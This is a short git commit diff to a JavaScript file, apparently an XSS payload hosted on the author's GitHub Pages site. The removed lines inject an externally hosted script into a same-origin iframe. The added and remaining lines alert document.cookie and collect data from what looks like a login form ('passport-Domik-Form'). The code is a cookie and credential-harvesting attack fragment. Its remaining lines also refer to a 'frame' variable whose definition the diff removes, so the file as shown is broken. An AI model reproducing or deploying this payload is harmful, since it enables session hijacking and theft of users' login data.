87df0685141504d8b62b94f8afe1c8d99c3235cc
vasilevigor3 <32871596+vasilevigor3@users.noreply.github.com>
2023-08-11 12:39:24 +0400

    Update myjs.js

--- myjs.js
+++ myjs.js
@@ -1,13 +1,4 @@
-document.createElement('div');
-
-frame=document.createElement("iframe");
-frame.src="/css/bootstrap.min.css";
-document.body.appendChild(frame);
-script=document.createElement('script');
-script.src='//vasilevigor3.github.io/myjs.js';
-window.frames[0].document.head.appendChild(script);
-
-javascript:alert(1);
+javascript:alert(document.cookie);
 var iframeDocument = frame.contentWindow.document;
 
 var formData = new FormData(iframeDocument.querySelector('form.passport-Domik-Form'))
